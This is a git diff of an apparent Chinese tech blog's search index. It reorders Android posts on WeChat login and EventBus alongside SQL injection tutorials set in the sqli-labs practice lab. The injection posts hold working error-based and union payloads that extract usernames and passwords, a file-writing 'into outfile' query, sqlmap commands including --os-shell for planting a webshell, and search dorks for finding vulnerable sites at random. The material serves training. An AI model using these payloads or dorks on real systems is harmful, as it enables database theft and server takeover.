@@ -10553,78 +10506,50 @@ http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
       </tags>
   </entry>
   <entry>
-    <title>android微信第三方登录1</title>
-    <url>/post/2304481464.html</url>
-    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
-<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
-<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
-<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
-<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
-<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
+    <title>android EventBus 使用</title>
+    <url>/post/3369655730.html</url>
+    <content><![CDATA[<p>2017 10 27<br>EventBus是什么？<br>首先有两个概念发布者/订阅者  </p>
+<p>发布者就是 发送事件<br>订阅者 就是接收事件  </p>
+<pre><code>gradle
+
+compile &#39;org.greenrobot:eventbus:3.0.0&#39;
+</code></pre><p>1.定义事件</p>
 <pre><code>
-private static final String APP_ID="你的appid";
-private IWXAPI api;
-private void regToWx(){
-    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
-    api.registerApp(APP_ID);
-}
-@Override
-protected void onCreate(Bundle savedInstanceState) {
-      super.onCreate(savedInstanceState);
-      setContentView(R.layout.activity_main);
-      //注册微信
-      regToWx();
-}
+// 定义事件 这个就是你要传送的数据实体类
+public static class MessageEvent { /* Additional fields if needed */ }
 </code></pre>
 
 
+<p>2.准备订阅者</p>
+<pre><code>
+@Subscribe(threadMode = ThreadMode.MAIN)  
+public void onMessageEvent(MessageEvent event) {/* Do something */};
 
+// 订阅者 接受数据的方法 threadMode  是运行在什么线程模式
+http://greenrobot.org/eventbus/documentation/delivery-threads-threadmode/
+</code></pre>
 
-<p>[2]登录微信</p>
-<pre><code>@Override
-protected void onCreate(Bundle savedInstanceState) {
-    super.onCreate(savedInstanceState);
-    setContentView(R.layout.activity_main);
-    //注册微信
-    regToWx();
-    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
-        @Override
-        public void onClick(View v) {
-            //登录微信
-            final SendAuth.Req req = new SendAuth.Req();
-            req.scope = &quot;snsapi_userinfo&quot;;
-            req.state = &quot;wechat_sdk_demo_test&quot;;
-            api.sendReq(req);
-        }
-    });
-}
-</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
-<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
-<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
-&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
-</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
-<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
-    android:label=&quot;@string/app_name&quot;
-    android:exported=&quot;true&quot;
-    android:launchMode=&quot;singleTop&quot;
-    &gt;
-&lt;/activity&gt;
-</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
-<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
-<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
-]]></content>
+<p>注册和取消注册订阅者</p>
+<pre><code> @Override
+ public void onStart() {
+     super.onStart();
+     EventBus.getDefault().register(this);
+ }
+
+ @Override
+ public void onStop() {
+     super.onStop();
+     EventBus.getDefault().unregister(this);
+ }
+</code></pre><p>3.发送事件</p>
+<pre><code>`EventBus.getDefault().post(new MessageEvent());`
+</code></pre>]]></content>
       <categories>
         <category>android</category>
       </categories>
       <tags>
         <tag>android</tag>
-        <tag>weixin</tag>
+        <tag>eventbus</tag>
       </tags>
   </entry>
   <entry>
@@ -11011,6 +10936,81 @@ protected void initData() {
       </tags>
   </entry>
   <entry>
+    <title>android微信第三方登录1</title>
+    <url>/post/2304481464.html</url>
+    <content><![CDATA[<p><a href="https://github.com/shaomiao/AndroidWechatTest" target="_blank" rel="noopener">github测试地址</a><br><a href="https://pay.weixin.qq.com/wiki/doc/api/app/app.php?chapter=11_1" target="_blank" rel="noopener">微信SDK下载地址</a><br><a href="https://open.weixin.qq.com/" target="_blank" rel="noopener">微信开放平台</a><br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=1417751808&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">微信api</a>  </p>
+<h2 id="开始接入微信登录"><a href="#开始接入微信登录" class="headerlink" title="开始接入微信登录"></a>开始接入微信登录</h2><p>1.申请你的AppID<br>注意：  </p>
+<h5 id="包名正确（重要）"><a href="#包名正确（重要）" class="headerlink" title="包名正确（重要）"></a>包名正确（重要）</h5><h5 id="签名正确（重要）"><a href="#签名正确（重要）" class="headerlink" title="签名正确（重要）"></a>签名正确（重要）</h5><p>微信提供的签名生成工具<br>把包名添加上去就可以获取签名<br>注意：把要获取签名的应用安装在手机上<br><a href="https://res.wx.qq.com/open/zh_CN/htmledition/res/dev/download/sdk/Gen_Signature_Android2.apk" target="_blank" rel="noopener">获取签名应用</a>  </p>
+<p>2.下载开发工具包<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN" target="_blank" rel="noopener">https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419319167&amp;lang=zh_CN</a>  </p>
+<p>3.在项目中引入开发包<br><img src="http://upload-images.jianshu.io/upload_images/2590671-b6783667e961b04b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="在项目中引入开发工具包">  </p>
+<p>4.使用开发工具包<br>下面代码都是在MainActivity中<br>[1]注册微信  </p>
+<pre><code>
+private static final String APP_ID="你的appid";
+private IWXAPI api;
+private void regToWx(){
+    api= WXAPIFactory.createWXAPI(this,APP_ID,true);
+    api.registerApp(APP_ID);
+}
+@Override
+protected void onCreate(Bundle savedInstanceState) {
+      super.onCreate(savedInstanceState);
+      setContentView(R.layout.activity_main);
+      //注册微信
+      regToWx();
+}
+</code></pre>
+
+
+
+
+<p>[2]登录微信</p>
+<pre><code>@Override
+protected void onCreate(Bundle savedInstanceState) {
+    super.onCreate(savedInstanceState);
+    setContentView(R.layout.activity_main);
+    //注册微信
+    regToWx();
+    findViewById(R.id.wechat_login).setOnClickListener(new View.OnClickListener() {
+        @Override
+        public void onClick(View v) {
+            //登录微信
+            final SendAuth.Req req = new SendAuth.Req();
+            req.scope = &quot;snsapi_userinfo&quot;;
+            req.state = &quot;wechat_sdk_demo_test&quot;;
+            api.sendReq(req);
+        }
+    });
+}
+</code></pre><p>5.下面是最重要的一步。。。。<br>[1]建包<br>注意：要在你的包名下新建 wxapi 包<br>你的包名.wxapi  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-972bd98cefcbe360.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="你的包名.wxapi"></p>
+<p>[2]建立与微信通讯的activity<br>在wxapi下新建activity<br>WXEntryActivity<br>[3]在AndroidManifest.xml中添加权限.   </p>
+<pre><code>&lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;/&gt; 
+&lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;/&gt;
+</code></pre><p>[4]在AndroidManifest.xml中添加activity注册.   </p>
+<pre><code>&lt;activity android:name=&quot;.wxapi.WXEntryActivity&quot;
+    android:label=&quot;@string/app_name&quot;
+    android:exported=&quot;true&quot;
+    android:launchMode=&quot;singleTop&quot;
+    &gt;
+&lt;/activity&gt;
+</code></pre><p>[5]在WXEntryActivity中继承Activity并实现IWXAPIEventHandler接口.   </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-4a894506b8235e85.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="实现IWXAPIEventHandler接口"><br>重写onCreate方法<br>在onCreate中需要重新注册一下微信<br>要不微信不执行回掉<br><img src="http://upload-images.jianshu.io/upload_images/2590671-bb5ff100cf328000.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="重写onCreate方法"></p>
+<p>实现onReq和onResp方法<br><a href="http://www.jianshu.com/p/c92e1134448d" target="_blank" rel="noopener">使用okhttp获取微信的openid和用户信息</a></p>
+<p>在onResp中可以获取code<br> 通过code参数加上AppID和AppSecret等，通过API换取access_token；<br> 通过access_token进行接口调用，获取用户基本数据资源或帮助用户实现基本操作。<br><a href="https://open.weixin.qq.com/cgi-bin/showdocument?action=dir_list&amp;t=resource/res_list&amp;verify=1&amp;id=open1419317851&amp;token=dcf5c640a7da2e579f50e32e282eb1bc1f384c0b&amp;lang=zh_CN" target="_blank" rel="noopener">详情请参照</a></p>
+<p><img src="http://upload-images.jianshu.io/upload_images/2590671-8052581cdb699373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="onReq和onResp方法">  </p>
+]]></content>
+      <categories>
+        <category>android</category>
+      </categories>
+      <tags>
+        <tag>android</tag>
+        <tag>weixin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>android微信第三方登录2</title>
     <url>/post/273860866.html</url>
     <content><![CDATA[<p>利用http与微信通信换取用户信息和openid<br>使用了okhttp作为http通信的框架  </p>
@@ -11170,47 +11170,6 @@ http://localhost:90/Less-8/?id=1 and ascii((substr((select table_name from infor
       </tags>
   </entry>
   <entry>
-    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
-    <url>/post/4239639054.html</url>
-    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
-<pre><code>if($row)
-{
-    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
-}
-else
-{
-    print_r(mysql_error());
-}
-</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
-<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
-
-http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
-<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
-select ectractvalue(1,concat(0x7e,(select user()),0x7e));
-select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
-
-报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
-http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
-</code></pre>]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>1.2.1-SQL注入-SQL注入语法类型-union联合查询注入</title>
     <url>/post/2839042794.html</url>
     <content><![CDATA[<h2 id="union查询注入"><a href="#union查询注入" class="headerlink" title="union查询注入"></a>union查询注入</h2><h3 id="union介绍"><a href="#union介绍" class="headerlink" title="union介绍"></a>union介绍</h3><p>SQL UNION 操作符<br>用于合并两个或多个SELECT语句的结果集。<br>注意：<br>SELECT语句必须拥有<strong>相同数量</strong>的列。<br>列也必须拥有<strong>相似的数据类型</strong>。<br>每条SELECT语句中列的<strong>顺序必须相同</strong>。  </p>
@@ -11271,6 +11230,47 @@ http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(tab
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+
 
 http://127.0.0.1:90/Less-1/?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from users)--+
+</code></pre>]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.2.2-SQL注入-SQL注入语法类型-报错注入</title>
+    <url>/post/4239639054.html</url>
+    <content><![CDATA[<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="01-报错注入原理"><a href="#01-报错注入原理" class="headerlink" title="01 报错注入原理"></a>01 报错注入原理</h3><p>构造payload让信息通过错误提示回显出来<br>应用场景：<br>查询不回显内容，会打印错误信息<br>Update、insert等语句，会打印错误信息  </p>
+<pre><code>if($row)
+{
+    echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];
+}
+else
+{
+    print_r(mysql_error());
+}
+</code></pre><h3 id="02-报错注入方法"><a href="#02-报错注入方法" class="headerlink" title="02 报错注入方法"></a>02 报错注入方法</h3><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/01.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/02.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/03.png" alt=""></p>
+<pre><code>select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2));
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select version()),floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select user()),0x7e,floor(rand(0)*2)))--+
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat((select database() limit 0,1),0x7e,floor(rand(0)*2)))--+ // 表名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 3,1),0x7e,floor(rand(0)*2)))--+ // 列名
+
+http://127.0.0.1:90/Less-1/?id=1&#39; and (select count(*) from information_schema.tables group by concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x7e,floor(rand(0)*2)))--+ // 数据
+</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/04.png" alt=""><br><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/04/05.png" alt=""></p>
+<pre><code>// 特殊符号导致方法报错，报错可以输出错误信息
+select ectractvalue(1,concat(0x7e,(select user()),0x7e));
+select updatexml(1,concat(0x7e,(select user()),0x7e),1);  
+
+报错注入只有32位长 用 substr截取字符串substr(&#39;ab&#39;,1,2) // 从第一位截取两个
+http://127.0.0.1:90/Less-1/?id=1&#39; and updatexml(1,concat(0x7e,(select substr(concat(password),1,2) from users limit 0,1),0x7e),1) --+
 </code></pre>]]></content>
       <categories>
         <category>web安全</category>
@@ -11345,49 +11345,6 @@ python --version
 <hr>
 <p>容器-&gt;<br>    IIS、Apach、TomCat、Nginx</p>
 <h3 id="02-理解SQL注入"><a href="#02-理解SQL注入" class="headerlink" title="02 理解SQL注入"></a>02 理解SQL注入</h3><p>所有SQL语句 都有可能SQL注入  </p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>sql注入</tag>
-        <tag>web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
-    <url>/post/2284174451.html</url>
-    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
-<ul>
-<li>报错注入  </li>
-<li>盲注</li>
-<li>Update注入</li>
-<li>Insert注入</li>
-<li>Header注入</li>
-<li>二阶注入</li>
-<li>绕过WADF</li>
-</ul>
-<ol>
-<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
-</ol>
-<ul>
-<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
-<li>WAMP的www目录下 解压缩sqli-labs</li>
-<li>启动服务器</li>
-<li>配置数据库（root）phpMyadamin </li>
-<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
-<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
-</ul>
-<ol start="2">
-<li>Docker</li>
-</ol>
-<ul>
-<li>docker search sqli-labs</li>
-<li>docker pull acgplano/sqli-labs</li>
-<li>docker images</li>
-<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
-</ul>
-<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
 ]]></content>
       <categories>
         <category>web安全</category>
@@ -11475,56 +11432,40 @@ cd /var/www/html/Less-1
       </tags>
   </entry>
   <entry>
-    <title>1.1.1-SQL注入-SQL注入基础-SQL注入流程</title>
-    <url>/post/820776471.html</url>
-    <content><![CDATA[<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="01-寻找SQL注入点"><a href="#01-寻找SQL注入点" class="headerlink" title="01 寻找SQL注入点"></a>01 寻找SQL注入点</h4><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><p>无特定目标：<br>inurl:.php?id=  </p>
-<p>有特定目标：<br>inurl:.php?id=site:target.com<br>// jsp sid   </p>
-<p>工具爬取：<br>spider,对搜索引擎和目标网站的链接进行爬取  </p>
-<p><strong>注入识别</strong><br>手工简单识别：  </p>
-<pre><code>&#39;
-and 1=1 / and 1=2
-and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2 
-and 1 like 1 / and 1 like 2
-</code></pre><p>工具识别：  </p>
-<pre><code>sqlmap -m filename (filename中保存检测目标)
-sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
-</code></pre><p><strong>高级识别：</strong><br>扩展识别广度和深度：  </p>
-<pre><code>SqlMap --level 增加测试级别，对header中相关参数也进行测试
-sqlmap -r filename (filename中为网站请求数据)
-</code></pre><p>利用工具提高识别效率：</p>
-<pre><code>BurpSuite + SqlMap
-BurpSuite拦截所有浏览器访问提交的数据
-BurpSuite扩展插件，直接调用SqlMap进行测试
-</code></pre><p>一些Tips：  </p>
-<p>可以在参数后键入“*” 来确定想要测试的参数<br>可能出现注入的点：新闻、登录、搜索、留言… …<br>站在开发的角度去寻找  </p>
-<hr>
-<pre><code>python sqlmap.py -r 1.txt
-</code></pre><p>burp sqlmap 扩展<br>Burp-&gt; Extender-&gt;BApp Store -&gt; SQLiPy Sqlmap  </p>
-<p><strong>代码审计：</strong></p>
-<p>搜索关键代码和函数<br>梳理业务流程  </p>
-<p>强网杯WEB “python is the best language”  </p>
-<pre><code>http://test.com/register  
-POST:  
-
-username=test&amp;email=t@t.com&amp;password=123&amp;password2=123&amp;submit=Register  
-username=test&amp;email=t@t.com&#39; and &#39;1&#39; = &#39;1&amp;password=123&amp;password2=123&amp;submit=Register  
-</code></pre><h4 id="02-SQL注入流程"><a href="#02-SQL注入流程" class="headerlink" title="02 SQL注入流程"></a>02 SQL注入流程</h4><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/01.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/02.png" alt=""></p>
-<p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/03.png" alt=""></p>
-<p>数据获取</p>
-<pre><code>web.mdb
-
-select [*] from admin
-select [*] from system
-
-select [username] from system
-select [name] from system
-</code></pre><p><img src="https://coding.net/u/tea9/p/image/git/raw/master/blog_img/02/04.png" alt=""></p>
-<p>提权</p>
-<pre><code>xp.cmdshell
-
---os-shell // 执行系统命令 写webshell到网站目录
-</code></pre>]]></content>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入练习环境搭建</title>
+    <url>/post/2284174451.html</url>
+    <content><![CDATA[<h2 id="SQL注入练习环境搭建"><a href="#SQL注入练习环境搭建" class="headerlink" title="SQL注入练习环境搭建"></a>SQL注入练习环境搭建</h2><p>Sqli-labs<br><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a>  </p>
+<ul>
+<li>报错注入  </li>
+<li>盲注</li>
+<li>Update注入</li>
+<li>Insert注入</li>
+<li>Header注入</li>
+<li>二阶注入</li>
+<li>绕过WADF</li>
+</ul>
+<ol>
+<li>PHP+MySql+Apache<br>WAMP<br>windows  </li>
+</ol>
+<ul>
+<li>下载安装WAMP <a href="http://www.wampserver.com/en/" target="_blank" rel="noopener">http://www.wampserver.com/en/</a></li>
+<li>WAMP的www目录下 解压缩sqli-labs</li>
+<li>启动服务器</li>
+<li>配置数据库（root）phpMyadamin </li>
+<li>修改配置 sqli-labs/sql-connections/db-creds.inc</li>
+<li><a href="http://localhost/sqli-labs" target="_blank" rel="noopener">http://localhost/sqli-labs</a>  点击 setup/reset database for labs</li>
+</ul>
+<ol start="2">
+<li>Docker</li>
+</ol>
+<ul>
+<li>docker search sqli-labs</li>
+<li>docker pull acgplano/sqli-labs</li>
+<li>docker images</li>
+<li>docker run -dt --name sqli -p 80:80 --rm acgplano/sqli-labs  (-dt 后台运行 –name 命名 -p 端口名  80:80 本地：docker --rm 当停止后删除产生镜像)</li>
+</ul>
+<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>对应代码，边看代码边理解，学会一半，就基本没问题。  </p>
+]]></content>
       <categories>
         <category>web安全</category>
       </categories>
@@ -11767,6 +11708,65 @@ http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into o
 http://127.0.0.1/Less-1/?id=&#39; union select 1,2,(select &#39;test&#39; into outfile &#39;/tmp/t.txt&#39;)--+ 写文件
 </code></pre><p><a href="http://127.0.0.1:90/Less-1/" target="_blank" rel="noopener">http://127.0.0.1:90/Less-1/</a></p>
 ]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>sql注入</tag>
+        <tag>web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1.1.1-SQL注入-SQL注入基础-SQL注入流程</title>
+    <url>/post/820776471.html</url>
+    <content><![CDATA[<h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="01-寻找SQL注入点"><a href="#01-寻找SQL注入点" class="headerlink" title="01 寻找SQL注入点"></a>01 寻找SQL注入点</h4><h5 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h5><p>无特定目标：<br>inurl:.php?id=  </p>
+<p>有特定目标：<br>inurl:.php?id=site:target.com<br>// jsp sid   </p>
+<p>工具爬取：<br>spider,对搜索引擎和目标网站的链接进行爬取  </p>
+<p><strong>注入识别</strong><br>手工简单识别：  </p>
+<pre><code>&#39;
+and 1=1 / and 1=2
+and &#39;1&#39;=&#39;1 / and &#39;1&#39;=&#39;2 
+and 1 like 1 / and 1 like 2
+</code></pre><p>工具识别：  </p>
+<pre><code>sqlmap -m filename (filename中保存检测目标)
+sqlmap --crawl(sqlmap对目标网站进行爬取，然后依次进行测试)
+</code></pre><p><strong>高级识别：</strong><br>扩展识别广度和深度：  </p>
+<pre><code>SqlMap --level 增加测试级别，对header中相关参数也进行测试
+sqlmap -r filename (filename中为网站请求数据)
+</code></pre><p>利用工具提高识别效率：</p>
+<pre><code>BurpSuite + SqlMap
+BurpSuite拦截所有浏览器访问提交的数据
+BurpSuite扩展插件，直接调用SqlMap进行测试
+</code></pre><p>一些Tips：  </p>
+<p>可以在参数后键入“*” 来确定想要测试的参数<br>可能出现注入的点：新闻、登录、搜索、留言… …<br>站在开发的角度去寻找  </p>
+<hr>
+<pre><code>python sqlmap.py -r 1.txt
+</code></pre><p>burp sqlmap 扩展<br>Burp-&gt; Extender-&gt;BApp Store -&gt; SQLiPy Sqlmap  </p>
+<p><strong>代码审计：</strong></p>
+<p>搜索关键代码和函数<br>梳理业务流程  </p>
+<p>强网杯WEB “python is the best language”  </p>
+<pre><code>http://test.com/register  
+POST:  
+
